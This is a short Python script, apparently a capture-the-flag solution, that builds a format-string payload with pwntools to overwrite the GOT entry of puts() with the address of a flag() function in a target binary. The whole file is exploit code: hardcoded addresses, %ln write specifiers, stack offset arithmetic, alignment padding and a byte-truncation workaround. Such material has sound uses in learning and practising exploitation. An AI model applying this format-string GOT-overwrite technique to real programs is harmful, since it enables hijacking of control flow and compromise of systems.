#!/usr/bin/env python
from pwn import *


def exploit():
	payload = ''

	# We shall replace puts() GOT entry with flag().
	addr_flag = 0x4011b6
	addr_puts_got = 0x404018

	# Format string to print bytes
	count_to_print = addr_flag  # replacement function address
	# count_to_print = 20   # test
	payload += '%@$0p'.replace('0', str(count_to_print))

	# Format string to write to the address (@ is a placeholder)
	offset = 8
	payload += '%@$ln'
	# payload += '-%@$lp-'  # test

	# We have written some stuff to the buffer,
	# the offset of 8 to the start of the buffer
	# We need to calculate the new index which points
	# to the address
	add_index = 3
	assert (len(payload) <= (add_index * 8))

	# Here, we will replace the placeholder @@ with the buffer index
	payload = payload.replace('@', str(offset + add_index))

	# We want to make the prior payload string to multiples
	# of 8 bytes. This is so our address will be aligned nicely
	payload = payload.ljust(add_index * 8)
	
	# Finally, write the target address
	payload += p64(addr_puts_got + 0xFF000000)
	
	# Strangely, the final byte before the null byte was truncated.
	# ie. \x18\x40\x40\x00 is the address, but \x18\x40 
	# gets called when I do some debugging. 
	# I assume it was due to fgets() removing that final byte.
	# As a workaround, I sent \x18\x40\x40\xFF which will get
	# truncated to \x18\x40\x40\x00

	print(payload)

exploit()
